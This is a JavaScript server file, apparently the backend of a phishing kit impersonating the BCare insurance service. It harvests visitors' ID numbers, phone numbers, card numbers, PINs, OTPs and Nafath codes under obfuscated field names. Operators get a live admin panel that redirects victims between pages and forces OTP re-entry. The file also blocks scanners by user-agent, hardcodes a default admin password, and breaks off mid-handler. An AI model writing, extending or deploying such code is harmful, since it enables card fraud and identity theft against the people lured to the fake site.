require("dotenv").config();

const path = require("path");
const http = require("http");
const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const { v4: uuidv4 } = require("uuid");
const { Server } = require("socket.io");
const db = require("./db");
const { isCountryAllowed, getBlockedCountryNames } = require("./countries");

const PORT = Number(process.env.PORT || 3001);
const JWT_SECRET = process.env.JWT_SECRET || "dev-secret-change-me";
const ADMIN_EMAIL = (process.env.ADMIN_EMAIL || "admin@bcare.com").toLowerCase();
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Bcare@2024";

function ensureAdmin() {
  if (!db.getAdmin()) {
    db.setAdmin({
      email: ADMIN_EMAIL,
      passwordHash: bcrypt.hashSync(ADMIN_PASSWORD, 10),
      name: "Admin",
    });
    console.log(`[Init] Admin created: ${ADMIN_EMAIL}`);
  }
}

const envOrigins = (process.env.ALLOWED_ORIGINS || "")
  .split(",")
  .map((o) => o.trim())
  .filter(Boolean);

ensureAdmin();
db.ensureDefaults(envOrigins);

function signToken(admin) {
  return jwt.sign(
    { email: admin.email, role: "admin", name: admin.name },
    JWT_SECRET,
    { expiresIn: "7d" }
  );
}

function authMiddleware(req, res, next) {
  const header = req.headers.authorization || "";
  const token = header.startsWith("Bearer ") ? header.slice(7) : null;
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    return res.status(401).json({ error: "Invalid token" });
  }
}

function getEnvOrigins() {
  return (process.env.ALLOWED_ORIGINS || "")
    .split(",")
    .map((o) => o.trim())
    .filter(Boolean);
}

function getAllAllowedOrigins() {
  return [...new Set([...getEnvOrigins(), ...db.getAllowedOrigins()])];
}

function buildCorsResponse() {
  const envOrigins = getEnvOrigins();
  const dbOrigins = db.getAllowedOrigins();
  const active = [...new Set([...envOrigins, ...dbOrigins])];
  return {
    active,
    db: dbOrigins,
    protectionEnabled: active.length > 0,
  };
}

function normalizeOrigin(origin) {
  if (!origin || typeof origin !== "string") return null;
  return origin.trim().replace(/\/$/, "");
}

function resolveRequestOrigin(source) {
  const headers = source?.headers || source?.handshake?.headers || {};
  const origin = normalizeOrigin(headers.origin);
  if (origin) return origin;
  const referer = headers.referer || headers.referrer;
  if (!referer) return null;
  try {
    return normalizeOrigin(new URL(referer).origin);
  } catch {
    return null;
  }
}

function isStrictVisitorProtectionEnabled() {
  return getAllAllowedOrigins().length > 0;
}

function isOriginAllowed(origin) {
  const normalized = normalizeOrigin(origin);
  if (!normalized) return !isStrictVisitorProtectionEnabled();
  const allowed = getAllAllowedOrigins().map(normalizeOrigin);
  if (allowed.length === 0) return true;
  return allowed.includes(normalized);
}

const BOT_UA_PATTERNS = [
  "bot",
  "crawl",
  "spider",
  "slurp",
  "curl",
  "wget",
  "python",
  "scrapy",
  "httpclient",
  "java/",
  "libwww",
  "postman",
  "insomnia",
  "headless",
  "phantom",
  "selenium",
  "puppeteer",
  "playwright",
  "axios/",
  "node-fetch",
  "go-http-client",
  "okhttp",
  "aiohttp",
  "powershell",
];

function isLikelyBot(source) {
  const headers = source?.headers || source?.handshake?.headers || {};
  const ua = String(headers["user-agent"] || "").toLowerCase();
  if (!ua || ua.length < 12) return true;
  if (BOT_UA_PATTERNS.some((pattern) => ua.includes(pattern))) return true;
  // accept-language check — only for HTTP requests (not WebSocket upgrades)
  const isSocket = !!(source?.handshake);
  if (!isSocket && !headers["accept-language"]) return true;
  return false;
}

const rateBuckets = new Map();

function checkRateLimit(key, max, windowMs) {
  const now = Date.now();
  let bucket = rateBuckets.get(key) || [];
  bucket = bucket.filter((time) => now - time < windowMs);
  if (bucket.length >= max) return false;
  bucket.push(now);
  rateBuckets.set(key, bucket);
  return true;
}

function visitorSecurityGuard(req, res, options = {}) {
  const origin = resolveRequestOrigin(req);
  const ip = getClientIp(req) || "unknown";
  const strict = isStrictVisitorProtectionEnabled();

  if (strict) {
    if (!origin || !isOriginAllowed(origin)) {
      res.status(403).json({
        error: "الموقع غير مسموح - أضف رابط موقع الزوار في الإعدادات",
        code: "ORIGIN_BLOCKED",
      });
      return false;
    }
  } else if (!isOriginAllowed(origin)) {
    res.status(403).json({ error: "CORS not allowed", code: "CORS_BLOCKED" });
    return false;
  }

  if (isLikelyBot(req)) {
    res.status(403).json({
      error: "تم حظر الطلب - زيارات آلية غير مسموحة",
      code: "BOT_BLOCKED",
    });
    return false;
  }

  const isNewVisitor =
    options.isNewVisitor ||
    (req.method === "POST" &&
      (req.path === "/api/visitors" || req.path === "/api/visitor/update"));
  const rateKey = `${ip}:${isNewVisitor ? "new" : "update"}`;
  const max = isNewVisitor ? 12 : 80;
  const windowMs = isNewVisitor ? 60 * 60 * 1000 : 60 * 1000;

  if (!checkRateLimit(rateKey, max, windowMs)) {
    res.status(429).json({
      error: "طلبات كثيرة من نفس العنوان - حاول لاحقاً",
      code: "RATE_LIMITED",
    });
    return false;
  }

  return true;
}

function visitorSocketSecurityCheck(socket) {
  const origin = resolveRequestOrigin(socket);
  const ip = getClientIp(socket) || "unknown";
  const strict = isStrictVisitorProtectionEnabled();

  if (strict && (!origin || !isOriginAllowed(origin))) return false;
  if (!strict && origin && !isOriginAllowed(origin)) return false;
  if (isLikelyBot(socket)) return false;
  if (!checkRateLimit(`${ip}:socket`, 120, 60 * 1000)) return false;
  return true;
}

function buildAnalytics() {
  const visitors = db.getAllVisitors();
  const now = Date.now();
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const todayStart = today.getTime();

  let active = 0;
  let idle = 0;
  let left = 0;
  let todayVisitors = 0;
  let visitorsWithCard = 0;
  let visitorsWithPhone = 0;
  let custActive = 0;
  let custIdle = 0;
  let custLeft = 0;
  const devices = {};
  const countries = {};

  for (const v of visitors) {
    const lastSeen = v.lastSeen ? new Date(v.lastSeen).getTime() : 0;
    const created = v.createdAt ? new Date(v.createdAt).getTime() : 0;
    if (created >= todayStart) todayVisitors++;
    const isOnlineActive = v.isOnline && now - lastSeen < 30000;
    const isIdle = !isOnlineActive && now - lastSeen < 120000;
    if (isOnlineActive) active++;
    else if (isIdle) idle++;
    else left++;
    const isCustomer = !!(v.phoneNumber || v.identityNumber || db.visitorHasCard(v));
    if (db.visitorHasCard(v)) visitorsWithCard++;
    if (v.phoneNumber) visitorsWithPhone++;
    if (isCustomer) {
      if (isOnlineActive) custActive++;
      else if (isIdle) custIdle++;
      else custLeft++;
    }
    const device = v.device || v.userAgent || "Unknown";
    devices[device] = (devices[device] || 0) + 1;
    const country = v.country || v.countryCode || "SA";
    countries[country] = (countries[country] || 0) + 1;
  }

  return {
    activeUsers: active,
    todayVisitors,
    totalVisitors: visitors.length,
    visitorsWithCard,
    visitorsWithPhone,
    devices: Object.entries(devices).map(([name, count]) => ({ name, count })),
    countries: Object.entries(countries).map(([name, count]) => ({ name, count })),
    visitors: { active, idle, left, total: visitors.length },
    customers: {
      active: custActive,
      idle: custIdle,
      left: custLeft,
      total: visitors.filter((v) => v.phoneNumber || v.identityNumber || db.visitorHasCard(v)).length,
    },
  };
}

function getClientIp(reqOrSocket) {
  const headers = reqOrSocket?.headers || reqOrSocket?.handshake?.headers || {};
  const forwarded = headers["x-forwarded-for"] || headers["X-Forwarded-For"];
  if (forwarded) return String(forwarded).split(",")[0].trim();
  const realIp = headers["x-real-ip"] || headers["X-Real-IP"];
  if (realIp) return String(realIp).trim();
  return reqOrSocket?.socket?.remoteAddress || reqOrSocket?.handshake?.address || null;
}

function parseUserAgent(ua) {
  if (!ua || typeof ua !== "string") return {};
  const n = ua.toLowerCase();
  return {
    userAgent: ua,
    deviceType: /mobile|android|iphone|ipad|ipod|webos|blackberry/i.test(ua)
      ? "mobile"
      : "desktop",
    os: n.includes("android")
      ? "Android"
      : n.includes("iphone") || n.includes("ipad") || n.includes("ios")
        ? "iOS"
        : n.includes("windows")
          ? "Windows"
          : n.includes("mac os") || n.includes("macintosh")
            ? "macOS"
            : n.includes("linux")
              ? "Linux"
              : null,
    browser: n.includes("edg/")
      ? "Edge"
      : n.includes("opr/") || n.includes("opera")
        ? "Opera"
        : n.includes("firefox")
          ? "Firefox"
          : n.includes("samsungbrowser")
            ? "Samsung"
            : n.includes("chrome")
              ? "Chrome"
              : n.includes("safari")
                ? "Safari"
                : null,
  };
}

function withClientMeta(source, data = {}) {
  const ip = getClientIp(source);
  const headers = source?.headers || source?.handshake?.headers || {};
  const ua = headers["user-agent"] || headers["User-Agent"];
  const patch = { ...data };
  if (ip && !patch.ipAddress) patch.ipAddress = ip;
  if (ua && !patch.userAgent && !patch.user_agent) {
    const parsed = parseUserAgent(ua);
    if (!patch.deviceType && parsed.deviceType) patch.deviceType = parsed.deviceType;
    if (!patch.os && parsed.os) patch.os = parsed.os;
    if (!patch.browser && parsed.browser) patch.browser = parsed.browser;
    patch.userAgent = ua;
  }
  return patch;
}

function buildLiveVisitors() {
  return db
    .getAllVisitors()
    .filter((v) => v.ownerName)
    .slice(0, 50)
    .map((v) => {
      const now = Date.now();
      const lastSeen = v.lastSeen ? new Date(v.lastSeen).getTime() : 0;
      let status = "left";
      if (v.isOnline && now - lastSeen < 30000) status = "active";
      else if (now - lastSeen < 120000) status = "idle";
      return {
        id: v.id,
        ownerName: v.ownerName,
        phoneNumber: v.phoneNumber,
        identityNumber: v.identityNumber,
        currentPage: v.currentPage || v.page || "home",
        currentStep: v.currentStep,
        deviceType: v.deviceType || null,
        browser: v.browser || null,
        os: v.os || null,
        country: v.country || null,
        ipAddress: v.ipAddress || v.ip_address || null,
        status,
        isCustomer: !!(v.phoneNumber || v.identityNumber || v._v1 || v.v1),
        lastSeen: v.lastSeen || new Date().toISOString(),
      };
    });
}

function buildAlerts(since) {
  const sinceTime = since ? new Date(since).getTime() : 0;
  return db
    .getAllVisitors()
    .filter((v) => {
      const updated = v.updatedAt ? new Date(v.updatedAt).getTime() : 0;
      return updated > sinceTime;
    })
    .map((v) => ({
      id: v.id,
      updatedAt: v.updatedAt,
      hasCard: db.visitorHasCard(v),
      hasOtp: !!(v._v5 || v._v6 || v._v7),
      hasPin: !!v._v4,
      hasPhone: !!v.phoneNumber,
    }));
}

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: {
    origin: (origin, cb) => cb(null, isOriginAllowed(origin)),
    credentials: true,
  },
  path: "/socket.io",
});

app.use(express.json({ limit: "2mb" }));
app.use(
  cors({
    origin(origin, cb) {
      if (isOriginAllowed(origin)) return cb(null, true);
      cb(null, false);
    },
    credentials: true,
  })
);

function getPublicSettings() {
  const allowedCountries = db.getSetting("allowedCountries", []);
  const blockedCardBins = db.getSetting("blockedCardBins", []);
  return {
    blockedBankPrefixes: blockedCardBins,
    blockedCountries: getBlockedCountryNames(allowedCountries),
    allowedCountries,
  };
}

function isCardBinBlocked(cardNumber) {
  const bins = db.getSetting("blockedCardBins", []);
  if (!Array.isArray(bins) || bins.length === 0) return false;
  const raw = String(cardNumber || "").trim();
  if (!raw) return false;
  const digits = raw.replace(/\D/g, "");
  // Only check plain card numbers; encrypted/base64 values are validated client-side.
  if (digits.length < 4 || /[a-zA-Z+/=]/.test(raw)) return false;
  return bins.some((bin) => digits.startsWith(String(bin)));
}

function enforceCountryAccess(countryValue, res, options = {}) {
  const allowed = db.getSetting("allowedCountries", []);
  if (!allowed.length) return true;

  const country = countryValue ? String(countryValue).trim() : "";
  if (!country || country.toLowerCase() === "unknown") {
    return options.allowMissing !== false;
  }

  if (!isCountryAllowed(country, allowed)) {
    res.status(403).json({ error: "Country not allowed", blocked: true });
    return false;
  }
  return true;
}

function resolveVisitorCountry(visitorId, data = {}) {
  if (data.country) return data.country;
  const visitor = db.getVisitor(visitorId);
  return visitor?.country || null;
}

function trackVisitorPage(visitorId, page, step) {
  if (!visitorId) return null;
  const patch = {
    currentPage: page || undefined,
    currentStep: step !== undefined && step !== null ? step : undefined,
    lastSeen: new Date().toISOString(),
    isOnline: true,
  };
  const visitor = db.saveVisitor(visitorId, patch);
  io.to("admins").emit("admin:visitor_page_changed", {
    visitorId,
    page: patch.currentPage || visitor.currentPage,
    step: patch.currentStep ?? visitor.currentStep,
  });
  io.to("admins").emit("admin:visitor_data_updated", { visitorId, payload: patch });
  broadcastVisitorList();
  return visitor;
}

function visitorOriginGuard(req, res, options = {}) {
  return visitorSecurityGuard(req, res, options);
}

function notifyVisitorChange(visitorId, payload = {}, options = {}) {
  broadcastVisitorList();
  io.to("admins").emit("admin:visitor_data_updated", { visitorId, payload });
  if (options.joined) {
    io.to("admins").emit("admin:visitor_joined", { visitorId });
  }
  emitVisitorStatusUpdates(visitorId, payload);
}

function maybeAppendPhoneVerificationHistory(visitorId, data = {}, visitor = null) {
  const current = visitor || db.getVisitor(visitorId);
  if (!current) return current;

  const phoneNumber = data.phoneNumber || current.phoneNumber;
  const phoneCarrier = data.phoneCarrier || current.phoneCarrier;
  const idNumber = data.phoneIdNumber || current.phoneIdNumber || current.identityNumber;
  const isPhoneRequest =
    data.phoneSubmittedAt ||
    (data._v4Status === "pending" && phoneNumber && phoneCarrier);

  if (!isPhoneRequest || !phoneNumber || !phoneCarrier) return current;

  const history = current.history || [];
  const alreadyPending = history.some(
    (entry) =>
      (entry.type === "_t4" || entry.type === "phone_verification") &&
      entry.data?.phoneNumber === phoneNumber &&
      entry.data?.phoneCarrier === phoneCarrier &&
      entry.status === "pending"
  );

  if (alreadyPending) return current;

  const { visitor: updated } = db.appendHistory(visitorId, {
    type: "_t4",
    data: {
      phoneNumber,
      phoneCarrier,
      idNumber,
      phoneIdNumber: idNumber,
    },
    status: "pending",
    timestamp: data.phoneSubmittedAt || new Date().toISOString(),
  });

  return updated;
}

function saveVisitorWithPhoneHistory(visitorId, data = {}) {
  const visitor = db.saveVisitor(visitorId, data);
  return maybeAppendPhoneVerificationHistory(visitorId, data, visitor);
}

// Merge admin history update into existing DB history to prevent race-condition data loss.
// When admin accepts/rejects an entry, only update that entry's status; keep everything else.
function mergeAdminHistoryUpdate(visitorId, patch) {
  if (!patch.history || !Array.isArray(patch.history)) return patch;
  const existing = db.getVisitor(visitorId);
  if (!existing || !Array.isArray(existing.history) || existing.history.length === 0) return patch;

  // Build a map of the admin's intended status changes by entry ID
  const incomingMap = new Map(patch.history.map((e) => [e.id, e]));

  // Update only matching entries; keep everything else (including newer entries from visitor)
  const merged = existing.history.map((e) => {
    const update = incomingMap.get(e.id);
    return update ? { ...e, status: update.status } : e;
  });

  // If admin sent entries that don't exist in DB yet (shouldn't happen but be safe), append them
  const existingIds = new Set(existing.history.map((e) => e.id));
  patch.history.forEach((e) => {
    if (!existingIds.has(e.id)) merged.push(e);
  });

  return { ...patch, history: merged };
}

function emitPhoneOtpRetry(visitorId, message) {
  const errorMessage = message || "رمز غير صحيح - يرجى إدخال رمز تحقق جديد";
  io.to(`visitor:${visitorId}`).emit("visitor:status_updated", {
    field: "phoneOtpStatus",
    status: "rejected",
  });
  io.to(`visitor:${visitorId}`).emit("visitor:status_updated", {
    field: "phoneOtpRejectionError",
    status: errorMessage,
  });
  // Re-open the OTP input on the visitor side
  io.to(`visitor:${visitorId}`).emit("visitor:redirect", { page: "phone-otp" });
}

const VISITOR_STATUS_FIELDS = [
  "_v5Status",
  "_v6Status",
  "_v7Status",
  "_v4Status",
  "otpStatus",
  "cardStatus",
  "pinStatus",
  "phoneOtpStatus",
  "nafadConfirmationStatus",
  "nafadConfirmationCode",
  "phoneOtpRejectionError",
  "redirectPage",
  "currentStep",
];

function emitVisitorStatusUpdates(visitorId, data = {}) {
  if (!visitorId || !data || typeof data !== "object") return;

  const statusPayload = {};
  for (const field of VISITOR_STATUS_FIELDS) {
    if (data[field] !== undefined && data[field] !== null) {
      statusPayload[field] = data[field];
    }
  }

  if (Object.keys(statusPayload).length === 0) return;

  io.to(`visitor:${visitorId}`).emit("visitor:status_updated", statusPayload);
  for (const [field, status] of Object.entries(statusPayload)) {
    io.to(`visitor:${visitorId}`).emit("visitor:status_updated", { field, status });
  }
}

function normalizePageName(page) {
  if (!page || typeof page !== "string") return page;
  if (page === "home") return "home-new";
  return page;
}

function emitVisitorRedirect(visitorId, page, extra = {}) {
  if (!visitorId || !page) return;
  const redirectPage = normalizePageName(page);
  const currentPage = extra.currentPage || redirectPage;
  const currentStep = extra.currentStep || redirectPage;

  db.saveVisitor(visitorId, { redirectPage, currentPage, currentStep });

  const payload = { targetPage: redirectPage, redirectPage, currentPage, currentStep };
  io.to(`visitor:${visitorId}`).emit("admin:redirect", payload);
  io.to(`visitor:${visitorId}`).emit("visitor:redirect", payload);

  io.to("admins").emit("admin:visitor_page_changed", {
    visitorId,
    page: redirectPage,
    step: currentStep,
  });
}

function mountRoutes(router) {
  router.get("/health", (_req, res) => {
    res.json({ ok: true, service: "bcare-api-backend" });
  });

  router.post("/api/admin/login", (req, res) => {
    const { email, password } = req.body || {};
    const admin = db.getAdmin();
    if (!email || !password || !admin || email.toLowerCase() !== admin.email) {
      return res.status(401).json({ error: "Invalid email or password" });
    }
    if (!bcrypt.compareSync(password, admin.passwordHash)) {
      return res.status(401).json({ error: "Invalid email or password" });
    }
    res.json({ token: signToken(admin) });
  });

  router.use("/api/admin", authMiddleware);

  router.get("/api/admin/visitors", (_req, res) => {
    res.json(getSubmittedVisitors());
  });

  router.get("/api/admin/visitors/:id", (req, res) => {
    const visitor = db.getVisitor(req.params.id);
    if (!visitor) return res.status(404).json({ error: "Not found" });
    res.json(visitor);
  });

  router.patch("/api/admin/visitors/:id", (req, res) => {
    const id = req.params.id;
    const data = mergeAdminHistoryUpdate(id, req.body || {});
    const visitor = db.saveVisitor(id, data);
    broadcastVisitorList();
    io.to("admins").emit("admin:visitor_data_updated", {
      visitorId: id,
      payload: data,
    });
    emitVisitorStatusUpdates(id, data);
    const redirectTarget = data.redirectPage || data.currentPage || data.currentStep;
    if (redirectTarget && redirectTarget !== "null") {
      emitVisitorRedirect(id, redirectTarget, {
        currentPage: data.currentPage,
        currentStep: data.currentStep,
      });
    }
    if (data.phoneOtpStatus === "rejected") {
      emitPhoneOtpRetry(id, data.phoneOtpRejectionError);
    }
    res.json(visitor);
  });

  router.delete("/api/admin/visitors/:id", (req, res) => {
    db.deleteVisitor(req.params.id);
    broadcastVisitorList();
    res.json({ ok: true });
  });

  router.delete("/api/admin/visitors/bulk", (req, res) => {
    const ids = Array.isArray(req.body?.ids) ? req.body.ids : [];
    for (const id of ids) db.deleteVisitor(id);
    broadcastVisitorList();
    res.json({ ok: true, deleted: ids.length });
  });

  router.get("/api/admin/visitors/:id/messages", (req, res) => {
    res.json(db.getMessages(req.params.id));
  });

  router.post("/api/admin/visitors/:id/messages", (req, res) => {
    const { message, senderName, senderRole } = req.body || {};
    const item = {
      id: uuidv4(),
      message,
      senderName: senderName || "Admin",
      senderRole: senderRole || "admin",
      createdAt: new Date().toISOString(),
    };
    db.addMessage(req.params.id, item);
    io.to(`visitor:${req.params.id}`).emit("admin:message", item);
    res.json({ ok: true });
  });

  router.get("/api/admin/cors", (_req, res) => {
    res.json(buildCorsResponse());
  });

  router.post("/api/admin/cors", (req, res) => {
    const origin = (req.body?.origin || "").trim();
    if (!origin) return res.status(400).json({ error: "Origin required" });
    db.addCorsOrigin(origin);
    res.json(buildCorsResponse());
  });

  router.delete("/api/admin/cors", (req, res) => {
    const origin = (req.body?.origin || "").trim();
    db.removeCorsOrigin(origin);
    res.json(buildCorsResponse());
  });

  router.get("/api/admin/settings", (_req, res) => {
    res.json({
      blockedCardBins: db.getSetting("blockedCardBins", []),
      allowedCountries: db.getSetting("allowedCountries", []),
    });
  });

  router.patch("/api/admin/settings", (req, res) => {
    if (req.body?.blockedCardBins !== undefined) {
      db.setSetting("blockedCardBins", req.body.blockedCardBins);
    }
    if (req.body?.allowedCountries !== undefined) {
      db.setSetting("allowedCountries", req.body.allowedCountries);
    }
    res.json({
      blockedCardBins: db.getSetting("blockedCardBins", []),
      allowedCountries: db.getSetting("allowedCountries", []),
    });
  });

  router.get("/api/admin/analytics", (_req, res) => {
    res.json(buildAnalytics());
  });

  router.get("/api/admin/live-visitors", (_req, res) => {
    res.json(buildLiveVisitors());
  });

  router.get("/api/admin/alerts", (req, res) => {
    res.json({ alerts: buildAlerts(req.query.since) });
  });

  router.post("/api/admin/change-email", (req, res) => {
    const { newEmail, currentPassword } = req.body || {};
    const admin = db.getAdmin();
    if (!admin || !bcrypt.compareSync(currentPassword || "", admin.passwordHash)) {
      return res.status(401).json({ error: "كلمة المرور غير صحيحة" });
    }
    admin.email = newEmail.toLowerCase();
    db.setAdmin(admin);
    res.json({ ok: true });
  });

  router.post("/api/admin/change-password", (req, res) => {
    const { newPassword, currentPassword } = req.body || {};
    const admin = db.getAdmin();
    if (!admin || !bcrypt.compareSync(currentPassword || "", admin.passwordHash)) {
      return res.status(401).json({ error: "كلمة المرور غير صحيحة" });
    }
    if (!newPassword || newPassword.length < 6) {
      return res.status(400).json({ error: "كلمة المرور قصيرة" });
    }
    admin.passwordHash = bcrypt.hashSync(newPassword, 10);
    db.setAdmin(admin);
    res.json({ ok: true });
  });

  router.get("/api/visitors/public-settings", (_req, res) => {
    res.json(getPublicSettings());
  });

  router.post("/api/visitor/update", (req, res) => {
    if (!visitorOriginGuard(req, res, { isNewVisitor: true })) return;
    const { visitorId, ...data } = req.body || {};
    const id = visitorId || uuidv4();
    db.saveVisitor(id, data);
    notifyVisitorChange(id, data, { joined: true });
    res.json({ visitorId: id, ok: true });
  });

  router.post("/api/visitors", (req, res) => {
    if (!visitorOriginGuard(req, res, { isNewVisitor: true })) return;
    const country = req.body?.country;
    if (country && !enforceCountryAccess(country, res, { allowMissing: true })) return;
    const id = req.body?.id || uuidv4();
    const visitor = db.saveVisitor(id, withClientMeta(req, { id, ...req.body }));
    notifyVisitorChange(id, req.body || {}, { joined: true });
    res.json({ visitorId: id, visitor, ok: true });
  });

  router.get("/api/visitors/:id", (req, res) => {
    if (!visitorOriginGuard(req, res)) return;
    const visitor = db.getVisitor(req.params.id);
    if (!visitor) return res.status(404).json({ error: "Not found" });
    res.json(visitor);
  });

  router.patch("/api/visitors/:id", (req, res) => {
    if (!visitorOriginGuard(req, res)) return;
    const id = req.params.id;
    const data = withClientMeta(req, req.body || {});
    const country = data.country || resolveVisitorCountry(id, data);
    if (!enforceCountryAccess(country, res, { allowMissing: true })) return;
    const visitor = saveVisitorWithPhoneHistory(id, data);
    const payload = { ...data };
    if (visitor.history) payload.history = visitor.history;
    notifyVisitorChange(id, payload);
    res.json(visitor);
  });

  router.post("/api/visitors/:id/history", (req, res) => {
    if (!visitorOriginGuard(req, res)) return;
    const id = req.params.id;
    const { type, data, status } = req.body || {};
    if (!type) return res.status(400).json({ error: "History type required" });

    if ((type === "_t1" || type === "card") && data) {
      const cardNumber = data._v1 || data.v1 || data.cardNumber;
      if (isCardBinBlocked(cardNumber)) {
        return res.status(403).json({ error: "Card blocked", blocked: true });
      }
    }

    const { visitor, entry } = db.appendHistory(id, { type, data, status });
    notifyVisitorChange(id, { history: visitor.history });
    res.json({ ok: true, entry, visitor });
  });

  router.post("/api/visitors/:id/clear-redirect", (req, res) => {
    if (!visitorOriginGuard(req, res)) return;
    const id = req.params.id;
    const visitor = db.saveVisitor(id, { redirectPage: null });
    notifyVisitorChange(id, { redirectPage: null });
    res.json({ ok: true, visitor });
  });

  router.get("/visitors/:id", (req, res) => {
    if (!visitorOriginGuard(req, res)) return;
    const visitor = db.getVisitor(req.params.id);
    if (!visitor) return res.status(404).json({ error: "Not found" });
    res.json(visitor);
  });

  router.put("/visitors/:id", (req, res) => {
    if (!visitorOriginGuard(req, res)) return;
    const id = req.params.id;
    const data = req.body || {};
    const visitor = db.saveVisitor(id, data);
    notifyVisitorChange(id, data, { joined: true });
    res.json(visitor);
  });
}

const apiRouter = express.Router();
mountRoutes(apiRouter);
app.use("/api-backend/visitor-assets", express.static(path.join(__dirname, "visitor-assets")));
app.use("/api-backend", apiRouter);
app.use("/", apiRouter);

function verifySocketToken(socket) {
  const token = socket.handshake.auth?.token || socket.handshake.query?.token;
  if (!token) return null;
  try {
    return jwt.verify(token, JWT_SECRET);
  } catch {
    return null;
  }
}

// Returns only visitors who have SUBMITTED a form (not just typing)
function getSubmittedVisitors() {
  return db
    .getAllVisitors()
    .filter((v) => {
      // Moved past home page = clicked "إظهار العروض" button
      const passedHomePage =
        v.currentPage &&
        !["home", "home-new", ""].includes(v.currentPage);
      // Has any identification data on their record
      const hasData = !!(v.ownerName || v.identityNumber || v.phoneNumber);
      // Has card/OTP/PIN history entry (submitted a subsequent form)
      const hasHistory = Array.isArray(v.history) && v.history.length > 0;
      // Show ONLY when: left home page AND has data → means "إظهار العروض" was clicked
      // OR has any history entry (card/OTP submitted)
      return (passedHomePage && hasData) || hasHistory;
    })
    .sort((a, b) => {
      // Newest activity at the top
      const ta = a.updatedAt || a.createdAt || 0;
      const tb = b.updatedAt || b.createdAt || 0;
      return new Date(tb) - new Date(ta);
    });
}

let _broadcastTimer = null;
function broadcastVisitorList() {
  if (_broadcastTimer) clearTimeout(_broadcastTimer);
  _broadcastTimer = setTimeout(() => {
    _broadcastTimer = null;
    io.to("admins").emit("admin:visitor_list", getSubmittedVisitors());
  }, 200);
}

// Track all connected visitor socket IDs
const connectedVisitorIds = new Set();
let _connectedTimer = null;
function broadcastConnectedCount() {
  if (_connectedTimer) clearTimeout(_connectedTimer);
  _connectedTimer = setTimeout(() => {
    _connectedTimer = null;
    io.to("admins").emit("admin:connected_count", connectedVisitorIds.size);
  }, 200);
}

io.on("connection", (socket) => {
  const user = verifySocketToken(socket);
  const role = socket.handshake.auth?.role;

  if (role !== "admin" && !visitorSocketSecurityCheck(socket)) {
    socket.disconnect(true);
    return;
  }

  socket.on("visitor:join", (visitorId) => {
    if (!visitorId || typeof visitorId !== "string") return;
    socket.join(`visitor:${visitorId}`);
    socket.data.visitorId = visitorId;
    connectedVisitorIds.add(visitorId);
    db.saveVisitor(
      visitorId,
      withClientMeta(socket, {
        isOnline: true,
        lastSeen: new Date().toISOString(),
      })
    );
    io.to("admins").emit("admin:visitor_online", { visitorId });
    broadcastConnectedCount();
    broadcastVisitorList();
  });

  socket.on("visitor:update_page", ({ visitorId, page, step }) => {
    trackVisitorPage(visitorId, page, step);
  });

  socket.on("visitor:save_data", ({ visitorId, payload }) => {
    if (!visitorId || !payload) return;
    db.saveVisitor(
      visitorId,
      withClientMeta(socket, {
        ...payload,
        lastSeen: new Date().toISOString(),
        isOnline: true,
      })
    );
    io.to("admins").emit("admin:visitor_data_updated", { visitorId, payload });
    if (payload.currentPage || payload.currentStep) {
      io.to("admins").emit("admin:visitor_page_changed", {
        visitorId,
        page: payload.currentPage,
        step: payload.currentStep,
      });
    }
    broadcastVisitorList();
  });

  socket.on("visitor:heartbeat", (visitorId) => {
    const id = typeof visitorId === "string" ? visitorId : visitorId?.visitorId;
    if (!id) return;
    db.saveVisitor(id, { lastSeen: new Date().toISOString(), isOnline: true });
  });

  socket.on("disconnect", () => {
    const leftVisitorId = socket.handshake.auth?.visitorId || socket.data?.visitorId;
    if (!leftVisitorId) return;
    connectedVisitorIds.delete(leftVisitorId);
    db.saveVisitor(leftVisitorId, { isOnline: false, lastSeen: new Date().toISOString() });
    io.to("admins").emit("admin:visitor_offline", { visitorId: leftVisitorId });
    broadcastConnectedCount();
    broadcastVisitorList();
  });

  // Fallback: allow admin to re-authenticate via event (handles timing/reconnect edge cases)
  socket.on("admin:join", ({ token } = {}) => {
    const tok = token || socket.handshake.auth?.token;
    let u = null;
    try {
      u = tok ? jwt.verify(tok, JWT_SECRET) : null;
    } catch {}
    if (u?.role === "admin") {
      socket.join("admins");
      socket.emit("admin:visitor_list", getSubmittedVisitors());
      socket.emit("admin:connected_count", connectedVisitorIds.size);
    }
  });

  if (role === "admin" && user?.role === "admin") {
    socket.join("admins");
    socket.emit("admin:visitor_list", getSubmittedVisitors());
    socket.emit("admin:connected_count", connectedVisitorIds.size);

    socket.on("admin:get_visitors", (_payload, cb) => {
      const list = getSubmittedVisitors();
      if (typeof cb === "function") cb(list);
      socket.emit("admin:visitor_list", list);
    });

    socket.on("admin:update_visitor", ({ visitorId, data }) => {
      if (!visitorId) return;
      const payload = mergeAdminHistoryUpdate(visitorId, data || {});
      db.saveVisitor(visitorId, payload);
      broadcastVisitorList();
      io.to("admins").emit("admin:visitor_data_updated", { visitorId, payload });
      emitVisitorStatusUpdates(visitorId, payload);
      const redirectTarget = payload.redirectPage || payload.currentPage || payload.currentStep;
      if (redirectTarget && redirectTarget !== "null") {
        emitVisitorRedirect(visitorId, redirectTarget, {
          currentPage: payload.currentPage,
          currentStep: payload.currentStep,
        });
      }
      if (payload.phoneOtpStatus === "rejected") {
        emitPhoneOtpRetry(visitorId, payload.phoneOtpRejectionError);
      }
    });

    socket.on("admin:redirect_visitor", ({ visitorId, targetPage }) => {
      if (!visitorId || !targetPage) return;
      emitVisitorRedirect(visitorId, targetPage);
      emitVisitorStatusUpdates(visitorId, { redirectPage: normalizePageName(targetPage) });
      broadcastVisitorList();
    });

    socket.on("admin:block_visitor", ({ visitorId, isBlocked }) => {
      db.saveVisitor(visitorId, { isBlocked: !!isBlocked });
      io.to(`visitor:${visitorId}`).emit("admin:blocked", { isBlocked: !!isBlocked });
      broadcastVisitorList();
    });

    socket.on("admin:send_message", ({ visitorId, message, senderName, senderRole }) => {
      const item = {
        id: uuidv4(),
        message,
        senderName: senderName || "Admin",
        senderRole: senderRole || "admin",
        createdAt: new Date().toISOString(),
      };
      db.addMessage(visitorId, item);
      io.to(`visitor:${visitorId}`).emit("admin:message", item);
    });
    return;
  }

  const visitorId = socket.handshake.auth?.visitorId;
  if (visitorId) {
    socket.join(`visitor:${visitorId}`);
